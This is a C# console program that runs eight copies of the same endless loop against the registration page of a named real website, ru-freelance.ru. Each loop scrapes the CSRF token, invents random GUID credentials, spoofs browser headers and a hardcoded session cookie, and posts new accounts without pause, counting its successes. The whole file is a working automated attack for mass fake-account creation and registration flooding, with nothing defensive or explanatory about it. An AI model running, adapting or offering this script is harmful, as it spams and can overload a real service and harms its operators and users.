public class Program
{
    static async Task Main()
    {
        int count = 0;
        var task1 = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    HttpClient client = new HttpClient();
                    using HttpResponseMessage response = await client.GetAsync("https://ru-freelance.ru/registration");
                    response.EnsureSuccessStatusCode();
                    string header_csrf = response.Headers.GetValues("Set-cookie").First().Split(";")
                        .Where(str => str.StartsWith("csrftoken")).First().Split("=").Last();
                    string content = await response.Content.ReadAsStringAsync();
                    int startPos = content.IndexOf("value");
                    content = content.Substring(startPos + 7);
                    string csrf = content.Split("\"").First();
                    string[] guids = { "", "", "" };
                    for (int i = 0; i < 3; i++)
                    {
                        string guid = "";
                        for (int c = 0; c < 3; c++)
                        {
                            guid += Guid.NewGuid().ToString();
                        }
                        guids[i] = guid;
                    }
                    Dictionary<string, string> data = new Dictionary<string, string>
                    {
                        ["csrfmiddlewaretoken"] = csrf,
                        ["name"] = guids[0],
                        ["login"] = guids[1],
                        ["password"] = guids[2],
                        ["accept"] = "on",
                    };
                    HttpContent contentForm = new FormUrlEncodedContent(data);
                    client.DefaultRequestHeaders.Add("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Origin", "https://ru-freelance.ru");
                    client.DefaultRequestHeaders.Add("Referer", "https://ru-freelance.ru/login");
                    client.DefaultRequestHeaders.Add("Cookie", "csrftoken=" + header_csrf + "; sessionid=u6ekn6feu2siju2nwprqv3jhvef3zw4g");
                    using var result = await client.PostAsync("https://ru-freelance.ru/registration", contentForm);
                    result.EnsureSuccessStatusCode();
                    Console.WriteLine("Успешно... " + count++);
                }
                catch (HttpRequestException e)
                {
                    Console.WriteLine("Ошибка: ", e.Message);
                }
            }
        });
        var task2 = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    HttpClient client = new HttpClient();
                    using HttpResponseMessage response = await client.GetAsync("https://ru-freelance.ru/registration");
                    response.EnsureSuccessStatusCode();
                    string header_csrf = response.Headers.GetValues("Set-cookie").First().Split(";")
                        .Where(str => str.StartsWith("csrftoken")).First().Split("=").Last();
                    string content = await response.Content.ReadAsStringAsync();
                    int startPos = content.IndexOf("value");
                    content = content.Substring(startPos + 7);
                    string csrf = content.Split("\"").First();
                    string[] guids = { "", "", "" };
                    for (int i = 0; i < 3; i++)
                    {
                        string guid = "";
                        for (int c = 0; c < 3; c++)
                        {
                            guid += Guid.NewGuid().ToString();
                        }
                        guids[i] = guid;
                    }
                    Dictionary<string, string> data = new Dictionary<string, string>
                    {
                        ["csrfmiddlewaretoken"] = csrf,
                        ["name"] = guids[0],
                        ["login"] = guids[1],
                        ["password"] = guids[2],
                        ["accept"] = "on",
                    };
                    HttpContent contentForm = new FormUrlEncodedContent(data);
                    client.DefaultRequestHeaders.Add("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Origin", "https://ru-freelance.ru");
                    client.DefaultRequestHeaders.Add("Referer", "https://ru-freelance.ru/login");
                    client.DefaultRequestHeaders.Add("Cookie", "csrftoken=" + header_csrf + "; sessionid=u6ekn6feu2siju2nwprqv3jhvef3zw4g");
                    using var result = await client.PostAsync("https://ru-freelance.ru/registration", contentForm);
                    result.EnsureSuccessStatusCode();
                    Console.WriteLine("Успешно... " + count++);
                }
                catch (HttpRequestException e)
                {
                    Console.WriteLine("Ошибка: ", e.Message);
                }
            }
        });
        var task3 = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    HttpClient client = new HttpClient();
                    using HttpResponseMessage response = await client.GetAsync("https://ru-freelance.ru/registration");
                    response.EnsureSuccessStatusCode();
                    string header_csrf = response.Headers.GetValues("Set-cookie").First().Split(";")
                        .Where(str => str.StartsWith("csrftoken")).First().Split("=").Last();
                    string content = await response.Content.ReadAsStringAsync();
                    int startPos = content.IndexOf("value");
                    content = content.Substring(startPos + 7);
                    string csrf = content.Split("\"").First();
                    string[] guids = { "", "", "" };
                    for (int i = 0; i < 3; i++)
                    {
                        string guid = "";
                        for (int c = 0; c < 3; c++)
                        {
                            guid += Guid.NewGuid().ToString();
                        }
                        guids[i] = guid;
                    }
                    Dictionary<string, string> data = new Dictionary<string, string>
                    {
                        ["csrfmiddlewaretoken"] = csrf,
                        ["name"] = guids[0],
                        ["login"] = guids[1],
                        ["password"] = guids[2],
                        ["accept"] = "on",
                    };
                    HttpContent contentForm = new FormUrlEncodedContent(data);
                    client.DefaultRequestHeaders.Add("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Origin", "https://ru-freelance.ru");
                    client.DefaultRequestHeaders.Add("Referer", "https://ru-freelance.ru/login");
                    client.DefaultRequestHeaders.Add("Cookie", "csrftoken=" + header_csrf + "; sessionid=u6ekn6feu2siju2nwprqv3jhvef3zw4g");
                    using var result = await client.PostAsync("https://ru-freelance.ru/registration", contentForm);
                    result.EnsureSuccessStatusCode();
                    Console.WriteLine("Успешно... " + count++);
                }
                catch (HttpRequestException e)
                {
                    Console.WriteLine("Ошибка: ", e.Message);
                }
            }
        });
        var task4 = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    HttpClient client = new HttpClient();
                    using HttpResponseMessage response = await client.GetAsync("https://ru-freelance.ru/registration");
                    response.EnsureSuccessStatusCode();
                    string header_csrf = response.Headers.GetValues("Set-cookie").First().Split(";")
                        .Where(str => str.StartsWith("csrftoken")).First().Split("=").Last();
                    string content = await response.Content.ReadAsStringAsync();
                    int startPos = content.IndexOf("value");
                    content = content.Substring(startPos + 7);
                    string csrf = content.Split("\"").First();
                    string[] guids = { "", "", "" };
                    for (int i = 0; i < 3; i++)
                    {
                        string guid = "";
                        for (int c = 0; c < 3; c++)
                        {
                            guid += Guid.NewGuid().ToString();
                        }
                        guids[i] = guid;
                    }
                    Dictionary<string, string> data = new Dictionary<string, string>
                    {
                        ["csrfmiddlewaretoken"] = csrf,
                        ["name"] = guids[0],
                        ["login"] = guids[1],
                        ["password"] = guids[2],
                        ["accept"] = "on",
                    };
                    HttpContent contentForm = new FormUrlEncodedContent(data);
                    client.DefaultRequestHeaders.Add("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Origin", "https://ru-freelance.ru");
                    client.DefaultRequestHeaders.Add("Referer", "https://ru-freelance.ru/login");
                    client.DefaultRequestHeaders.Add("Cookie", "csrftoken=" + header_csrf + "; sessionid=u6ekn6feu2siju2nwprqv3jhvef3zw4g");
                    using var result = await client.PostAsync("https://ru-freelance.ru/registration", contentForm);
                    result.EnsureSuccessStatusCode();
                    Console.WriteLine("Успешно... " + count++);
                }
                catch (HttpRequestException e)
                {
                    Console.WriteLine("Ошибка: ", e.Message);
                }
            }
        });
        var task5 = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    HttpClient client = new HttpClient();
                    using HttpResponseMessage response = await client.GetAsync("https://ru-freelance.ru/registration");
                    response.EnsureSuccessStatusCode();
                    string header_csrf = response.Headers.GetValues("Set-cookie").First().Split(";")
                        .Where(str => str.StartsWith("csrftoken")).First().Split("=").Last();
                    string content = await response.Content.ReadAsStringAsync();
                    int startPos = content.IndexOf("value");
                    content = content.Substring(startPos + 7);
                    string csrf = content.Split("\"").First();
                    string[] guids = { "", "", "" };
                    for (int i = 0; i < 3; i++)
                    {
                        string guid = "";
                        for (int c = 0; c < 3; c++)
                        {
                            guid += Guid.NewGuid().ToString();
                        }
                        guids[i] = guid;
                    }
                    Dictionary<string, string> data = new Dictionary<string, string>
                    {
                        ["csrfmiddlewaretoken"] = csrf,
                        ["name"] = guids[0],
                        ["login"] = guids[1],
                        ["password"] = guids[2],
                        ["accept"] = "on",
                    };
                    HttpContent contentForm = new FormUrlEncodedContent(data);
                    client.DefaultRequestHeaders.Add("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Origin", "https://ru-freelance.ru");
                    client.DefaultRequestHeaders.Add("Referer", "https://ru-freelance.ru/login");
                    client.DefaultRequestHeaders.Add("Cookie", "csrftoken=" + header_csrf + "; sessionid=u6ekn6feu2siju2nwprqv3jhvef3zw4g");
                    using var result = await client.PostAsync("https://ru-freelance.ru/registration", contentForm);
                    result.EnsureSuccessStatusCode();
                    Console.WriteLine("Успешно... " + count++);
                }
                catch (HttpRequestException e)
                {
                    Console.WriteLine("Ошибка: ", e.Message);
                }
            }
        });
        var task6 = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    HttpClient client = new HttpClient();
                    using HttpResponseMessage response = await client.GetAsync("https://ru-freelance.ru/registration");
                    response.EnsureSuccessStatusCode();
                    string header_csrf = response.Headers.GetValues("Set-cookie").First().Split(";")
                        .Where(str => str.StartsWith("csrftoken")).First().Split("=").Last();
                    string content = await response.Content.ReadAsStringAsync();
                    int startPos = content.IndexOf("value");
                    content = content.Substring(startPos + 7);
                    string csrf = content.Split("\"").First();
                    string[] guids = { "", "", "" };
                    for (int i = 0; i < 3; i++)
                    {
                        string guid = "";
                        for (int c = 0; c < 3; c++)
                        {
                            guid += Guid.NewGuid().ToString();
                        }
                        guids[i] = guid;
                    }
                    Dictionary<string, string> data = new Dictionary<string, string>
                    {
                        ["csrfmiddlewaretoken"] = csrf,
                        ["name"] = guids[0],
                        ["login"] = guids[1],
                        ["password"] = guids[2],
                        ["accept"] = "on",
                    };
                    HttpContent contentForm = new FormUrlEncodedContent(data);
                    client.DefaultRequestHeaders.Add("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Origin", "https://ru-freelance.ru");
                    client.DefaultRequestHeaders.Add("Referer", "https://ru-freelance.ru/login");
                    client.DefaultRequestHeaders.Add("Cookie", "csrftoken=" + header_csrf + "; sessionid=u6ekn6feu2siju2nwprqv3jhvef3zw4g");
                    using var result = await client.PostAsync("https://ru-freelance.ru/registration", contentForm);
                    result.EnsureSuccessStatusCode();
                    Console.WriteLine("Успешно... " + count++);
                }
                catch (HttpRequestException e)
                {
                    Console.WriteLine("Ошибка: ", e.Message);
                }
            }
        });
        var task7 = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    HttpClient client = new HttpClient();
                    using HttpResponseMessage response = await client.GetAsync("https://ru-freelance.ru/registration");
                    response.EnsureSuccessStatusCode();
                    string header_csrf = response.Headers.GetValues("Set-cookie").First().Split(";")
                        .Where(str => str.StartsWith("csrftoken")).First().Split("=").Last();
                    string content = await response.Content.ReadAsStringAsync();
                    int startPos = content.IndexOf("value");
                    content = content.Substring(startPos + 7);
                    string csrf = content.Split("\"").First();
                    string[] guids = { "", "", "" };
                    for (int i = 0; i < 3; i++)
                    {
                        string guid = "";
                        for (int c = 0; c < 3; c++)
                        {
                            guid += Guid.NewGuid().ToString();
                        }
                        guids[i] = guid;
                    }
                    Dictionary<string, string> data = new Dictionary<string, string>
                    {
                        ["csrfmiddlewaretoken"] = csrf,
                        ["name"] = guids[0],
                        ["login"] = guids[1],
                        ["password"] = guids[2],
                        ["accept"] = "on",
                    };
                    HttpContent contentForm = new FormUrlEncodedContent(data);
                    client.DefaultRequestHeaders.Add("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Origin", "https://ru-freelance.ru");
                    client.DefaultRequestHeaders.Add("Referer", "https://ru-freelance.ru/login");
                    client.DefaultRequestHeaders.Add("Cookie", "csrftoken=" + header_csrf + "; sessionid=u6ekn6feu2siju2nwprqv3jhvef3zw4g");
                    using var result = await client.PostAsync("https://ru-freelance.ru/registration", contentForm);
                    result.EnsureSuccessStatusCode();
                    Console.WriteLine("Успешно... " + count++);
                }
                catch (HttpRequestException e)
                {
                    Console.WriteLine("Ошибка: ", e.Message);
                }
            }
        });
        var task8 = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    HttpClient client = new HttpClient();
                    using HttpResponseMessage response = await client.GetAsync("https://ru-freelance.ru/registration");
                    response.EnsureSuccessStatusCode();
                    string header_csrf = response.Headers.GetValues("Set-cookie").First().Split(";")
                        .Where(str => str.StartsWith("csrftoken")).First().Split("=").Last();
                    string content = await response.Content.ReadAsStringAsync();
                    int startPos = content.IndexOf("value");
                    content = content.Substring(startPos + 7);
                    string csrf = content.Split("\"").First();
                    string[] guids = { "", "", "" };
                    for (int i = 0; i < 3; i++)
                    {
                        string guid = "";
                        for (int c = 0; c < 3; c++)
                        {
                            guid += Guid.NewGuid().ToString();
                        }
                        guids[i] = guid;
                    }
                    Dictionary<string, string> data = new Dictionary<string, string>
                    {
                        ["csrfmiddlewaretoken"] = csrf,
                        ["name"] = guids[0],
                        ["login"] = guids[1],
                        ["password"] = guids[2],
                        ["accept"] = "on",
                    };
                    HttpContent contentForm = new FormUrlEncodedContent(data);
                    client.DefaultRequestHeaders.Add("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Origin", "https://ru-freelance.ru");
                    client.DefaultRequestHeaders.Add("Referer", "https://ru-freelance.ru/login");
                    client.DefaultRequestHeaders.Add("Cookie", "csrftoken=" + header_csrf + "; sessionid=u6ekn6feu2siju2nwprqv3jhvef3zw4g");
                    using var result = await client.PostAsync("https://ru-freelance.ru/registration", contentForm);
                    result.EnsureSuccessStatusCode();
                    Console.WriteLine("Успешно... " + count++);
                }
                catch (HttpRequestException e)
                {
                    Console.WriteLine("Ошибка: ", e.Message);
                }
            }
        });
        task1.Wait();
        task2.Wait();
        task3.Wait();
        task4.Wait();
        task5.Wait();
        task6.Wait();
        task7.Wait();
        task8.Wait();
    }
}